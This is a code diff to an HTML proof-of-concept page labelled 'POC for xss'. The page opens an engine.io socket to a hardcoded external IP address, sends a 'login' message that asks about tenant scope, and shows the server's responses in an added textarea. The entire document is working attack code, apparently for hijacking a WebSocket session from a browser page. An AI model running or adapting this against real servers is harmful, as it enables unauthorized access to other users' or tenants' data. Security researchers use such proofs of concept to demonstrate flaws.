@@ -3,9 +3,12 @@
 <h1>
     POC for xss.Created by johnstone.
 </h1>
-
+<textarea id="message" height="500px" width="400px"></textarea>
 <script src="/burp1.com/js/engine.io.js"></script>
 <script>
+  const textarea = document.getElementById('message');
+  
+  
   const socket = eio("https://154.43.165.231:8800/", { path: '/ws' ,transports: ["polling","websocket"],transportOptions: {
             polling: {
                 extraHeaders: {
@@ -15,14 +18,21 @@
         }});
   socket.on("connect", () => {
       console.log("connected"); // prints something like "l9IoONULqVPQYa0DAAAA"
+      textarea.value = textarea.value + "socket.io was connected.\n";
+      textarea.scrollTop = textarea.scrollHeight;
   });
     
   socket.on("open", () => {
       console.log("opened");
+      textarea.value = textarea.value + "socket.io was opened.\n";
       socket.send('2["login",{"all_tenants":false}]');
+      textarea.value = textarea.value + "Client:Send [\"login\",{\"all_tenants\":false}]\n";
+      textarea.scrollTop = textarea.scrollHeight;
       socket.send('helloworld!');
       socket.on("message", (data) => {
         console.log("Server response:"+data); // true
+        textarea.value = textarea.value + "Server:recieved" + data+ "\n";
+        textarea.scrollTop = textarea.scrollHeight;
       });
       socket.on('close', () => {});
   });
@@ -35,6 +45,6 @@
     socket.on('close', () => {});
   });*/
 </script>
-</script>
+
 </body>
 </html>
